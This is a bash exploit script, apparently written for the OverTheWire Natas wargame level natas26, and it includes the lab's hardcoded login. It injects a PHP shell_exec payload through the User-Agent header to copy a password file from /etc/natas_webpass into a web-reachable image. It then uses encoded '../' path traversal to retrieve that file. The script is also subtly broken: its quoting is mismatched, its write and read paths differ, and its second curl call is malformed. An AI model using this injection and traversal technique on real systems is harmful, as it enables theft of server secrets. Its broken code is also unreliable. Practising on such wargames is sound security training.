#!/bin/bash
website="http://natas26.natas.labs.overthewire.org/"

curl -u "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
	-H "Cookie: PHPSESSID=quantum" \
	-H "User-Agent: <?php shell_exec('\$(cat /etc/natas_webpass/natas26); >> img/natas26_quantum.png);  ?>" \
	-v \
	-c - \
	-X GET "http://natas26.natas.labs.overthewire.org/?x1=0&x2=400&y1=0&y2=300&submit=1"| batcat -l html

traversal="%2E%2E%2F%2E%2E%2F%2E%2E%2F"
website+="?"
website+=$traversal
website+="tmp/natas26_quantum.png"
sleep 0.5
curl -u "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
	-H "Cookie: PHPSESSID=quantum" \
	-v \
	-c - \
	echo $website | batcat -l html
